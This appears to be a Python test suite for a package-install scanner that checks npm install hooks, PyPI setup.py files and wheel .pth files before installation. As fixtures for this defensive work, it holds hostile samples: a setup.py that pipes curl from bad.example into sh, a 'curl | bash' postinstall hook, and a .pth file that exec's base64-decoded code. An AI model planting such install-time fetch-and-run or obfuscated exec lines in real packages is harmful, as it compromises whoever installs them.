import io
import tarfile
import unittest
import zipfile
from datetime import datetime, timedelta, timezone

from customs import Ecosystem
from customs.checkpoint import check_command, overall
from customs.registry import PackageFacts
from customs.verdict import Verdict
from customs import xray

NOW = datetime(2026, 10, 19, tzinfo=timezone.utc)


def make_sdist(setup_py: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        data = setup_py.encode()
        info = tarfile.TarInfo("pkg-1.0/setup.py")
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def make_wheel(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, body in files.items():
            z.writestr(name, body)
    return buf.getvalue()


CLEAN_SETUP = "from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
EVIL_SETUP = "import os\nos.system('curl -s https://bad.example/x | sh')\n"
CLEAN_PTH = "import _distutils_hack\n"
EVIL_PTH = "import base64,os; exec(base64.b64decode('cHJpbnQoMSk='))\n"


class ScanTextTests(unittest.TestCase):
    def test_pipe_to_shell_is_a_finding(self):
        self.assertTrue(xray.scan_text("curl -s http://x | sh", "postinstall script"))

    def test_plain_build_script_is_not(self):
        self.assertEqual(xray.scan_text("node-gyp rebuild", "install script"), [])

    def test_network_call_is_reported_by_behaviour(self):
        hits = xray.scan_text("requests.get('http://x')", "setup.py")
        self.assertEqual(hits, ["setup.py makes a network request"])


class NpmTests(unittest.TestCase):
    def test_install_hook_with_payload_is_a_finding(self):
        facts = PackageFacts(Ecosystem.NPM, "pkg", exists=True,
                             install_scripts={"postinstall": "curl http://x | bash"})
        result = xray.scan(facts, fetch=lambda url, limit: b"")
        self.assertTrue(result.findings)

    def test_benign_install_hook_is_not_a_finding(self):
        facts = PackageFacts(Ecosystem.NPM, "pkg", exists=True,
                             install_scripts={"install": "node-gyp rebuild"})
        result = xray.scan(facts, fetch=lambda url, limit: b"")
        self.assertEqual(result.findings, [])
        self.assertEqual(result.scanned, ["npm install script"])


class PyPITests(unittest.TestCase):
    def fetch(self, mapping):
        def _fetch(url, limit):
            return mapping[url]
        return _fetch

    def test_setup_py_payload_is_a_finding(self):
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True,
                             sdist_url="https://f/pkg.tar.gz")
        result = xray.scan(facts, self.fetch({"https://f/pkg.tar.gz": make_sdist(EVIL_SETUP)}))
        self.assertTrue(any("runs a shell command" in f for f in result.findings))

    def test_clean_setup_py_is_not_a_finding(self):
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, sdist_url="https://f/pkg.tar.gz")
        result = xray.scan(facts, self.fetch({"https://f/pkg.tar.gz": make_sdist(CLEAN_SETUP)}))
        self.assertEqual(result.findings, [])
        self.assertEqual(result.scanned, ["sdist setup.py"])

    def test_malicious_pth_in_wheel_is_a_finding(self):
        wheel = make_wheel({"pkg-1.0.dist-info/METADATA": "x", "evil.pth": EVIL_PTH})
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, wheel_urls=["https://f/pkg.whl"])
        result = xray.scan(facts, self.fetch({"https://f/pkg.whl": wheel}))
        self.assertTrue(any("evil.pth" in f for f in result.findings))

    def test_ordinary_pth_is_not_a_finding(self):
        wheel = make_wheel({"ns.pth": CLEAN_PTH})
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, wheel_urls=["https://f/pkg.whl"])
        self.assertEqual(xray.scan(facts, self.fetch({"https://f/pkg.whl": wheel})).findings, [])

    def test_oversized_artifact_is_skipped_not_flagged(self):
        def too_big(url, limit):
            raise OverflowError("over limit")
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, sdist_url="https://f/big.tar.gz")
        result = xray.scan(facts, too_big)
        self.assertEqual(result.findings, [])
        self.assertIsNone(result.error)
        self.assertTrue(result.skipped)

    def test_download_failure_is_an_error(self):
        def down(url, limit):
            raise OSError("connection reset")
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, sdist_url="https://f/pkg.tar.gz")
        self.assertIn("download failed", xray.scan(facts, down).error)

    def test_corrupt_archive_is_an_error(self):
        facts = PackageFacts(Ecosystem.PYPI, "pkg", exists=True, sdist_url="https://f/pkg.tar.gz")
        result = xray.scan(facts, self.fetch({"https://f/pkg.tar.gz": b"not a tarball"}))
        self.assertIn("could not be read", result.error)


class CheckpointXrayTests(unittest.TestCase):
    class Registry:
        def __init__(self, facts):
            self.facts = facts

        def inspect(self, ecosystem, name, version=None):
            return self.facts

    def facts(self, **kw):
        base = dict(ecosystem=Ecosystem.PYPI, name="pkg", exists=True,
                    first_published=NOW - timedelta(days=900), maintainers=2)
        base.update(kw)
        return PackageFacts(**base)

    def test_x_ray_finding_asks_and_does_not_block(self):
        f = self.facts(sdist_url="https://f/pkg.tar.gz")
        decisions = check_command("pip install pkg", self.Registry(f), NOW,
                                  xray_fetch=lambda url, limit: make_sdist(EVIL_SETUP))
        self.assertEqual(overall(decisions), Verdict.INSPECT)
        self.assertTrue(any("x-ray:" in r for r in decisions[0].reasons))

    def test_x_ray_failure_asks(self):
        f = self.facts(sdist_url="https://f/pkg.tar.gz")

        def down(url, limit):
            raise OSError("down")
        decisions = check_command("pip install pkg", self.Registry(f), NOW, xray_fetch=down)
        self.assertEqual(overall(decisions), Verdict.INSPECT)

    def test_skipped_artifact_is_visible_but_clear(self):
        f = self.facts(sdist_url="https://f/big.tar.gz")

        def too_big(url, limit):
            raise OverflowError("over limit")
        decisions = check_command("pip install pkg", self.Registry(f), NOW, xray_fetch=too_big)
        self.assertEqual(overall(decisions), Verdict.CLEAR)
        self.assertTrue(any(r.startswith("x-ray skipped") for r in decisions[0].reasons))

    def test_x_ray_can_be_disabled(self):
        f = self.facts(sdist_url="https://f/pkg.tar.gz")

        def boom(url, limit):
            raise AssertionError("must not download when disabled")
        decisions = check_command("pip install pkg", self.Registry(f), NOW,
                                  xray_enabled=False, xray_fetch=boom)
        self.assertEqual(overall(decisions), Verdict.CLEAR)


if __name__ == "__main__":
    unittest.main()
